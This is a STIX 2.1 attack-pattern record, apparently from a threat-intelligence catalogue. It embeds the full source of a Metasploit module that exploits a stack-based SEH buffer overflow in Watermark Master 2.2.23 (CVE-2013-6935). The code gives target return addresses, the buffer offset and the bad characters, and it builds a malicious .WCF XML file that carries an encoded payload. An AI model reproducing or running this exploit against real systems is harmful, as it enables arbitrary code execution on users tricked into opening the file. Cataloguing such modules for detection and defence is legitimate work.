{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--5c460725-6f79-4127-98c2-6877cb6b438f",
    "created": "2024-08-14T16:37:13.117871Z",
    "modified": "2024-08-14T16:37:13.117875Z",
    "name": "Watermark Master Buffer Overflow (SEH)",
    "description": " This module exploits a stack based buffer overflow in Watermark Master 2.2.23 when processing a specially crafted .WCF file. This vulnerability could be exploited by a remote attacker to execute arbitrary code on the target machine by enticing a user of Watermark Master to open a malicious .WCF file.  'License'    => MSF_LICENSE 'Notes' => { 'Stability' => [] 'SideEffects' => [] 'Reliability' => [] ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/fileformat/watermark_master.rb",
            "external_id": "watermark_master.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2013-6935"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = NormalRanking\n\n  include Msf::Exploit::FILEFORMAT\n  include Msf::Exploit::Seh\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'    => 'Watermark Master Buffer Overflow (SEH)',\n      'Description'  => %q{\n          This module exploits a stack based buffer overflow in Watermark Master 2.2.23 when\n          processing a specially crafted .WCF file. This vulnerability could be\n          exploited by a remote attacker to execute arbitrary code on the target\n          machine by enticing a user of Watermark Master to open a malicious .WCF file.\n      },\n      'License'    => MSF_LICENSE,\n      'Notes' => {\n        'Stability' => [],\n        'SideEffects' => [],\n        'Reliability' => []\n      },\n      'Author'    =>\n        [\n          'metacom',  # Original discovery\n          'Andrew Smith',  # MSF Module\n        ],\n      'References'  =>\n        [\n          [ 'OSVDB', '99226' ],\n          [ 'CVE', '2013-6935'],\n          [ 'EDB', '29327' ]\n        ],\n      'DefaultOptions' =>\n        {\n          'EXITFUNC' => 'process',\n        },\n      'Platform'  => 'win',\n      'Payload'  =>\n        {\n          'BadChars' => \"\\x00\\x0a\\x0d\\x3c\\x22\\x26\",\n          'DisableNops' => false,\n          'Space' => 7276\n        },\n\n      'Targets'    =>\n        [\n          [ 'Windows 7 x32 - Watermark Master 2.2.23',\n            {\n              'Ret'     =>  0x10015f2d, #p/p/r | CommonClassesMFC.dll\n              'Offset'  =>  516\n            }\n          ],\n          [ 'Windows 7 x64 - Watermark Master 2.2.23',\n            {\n              'Ret'     =>  0x1001329a, #p/p/r | CommonClassesMFC.dll\n              'Offset'  =>  516\n            }\n          ],\n        ],\n      'Privileged'  => false,\n      'DisclosureDate'  => '2013-11-01',\n      'DefaultTarget'  => 0))\n\n    register_options([OptString.new('FILENAME', [ false, 'The file name.', 'msf.wcf']),])\n\n  end\n\n  def exploit\n\n    buffer = rand_text(target['Offset'])\n    buffer << generate_seh_record(target.ret)\n    buffer << payload.encoded\n    buffer << rand_text(18000 - buffer.length)\n\n    file = %Q|<?xml version=\"1.0\" encoding=\"Windows-1252\" ?><config ver=\"2.2.23.00\">\n<cols name=\"Files\"/>\n<cols name=\"Profiles\">\n<Property name=\"Profile\">\n<cols name=\"Watermarks\"/>\n<cols name=\"Timelines\"/>\n<cols name=\"Streams\">\n<Property name=\"Stream\">\n<Value name=\"SourcePath\" type=\"8\" value=\"#{buffer}\"/>\n</Property>\n</cols>\n<cols name=\"\"/>\n</Property>\n</cols>\n</config>|\n\n    print_status(\"Creating '#{datastore['FILENAME']}' file ...\")\n    file_create(file)\n\n  end\nend\n",
    "x_mitre_disclosure_date": "2013-11-01",
    "x_mitre_platforms": [
        "win'"
    ]
}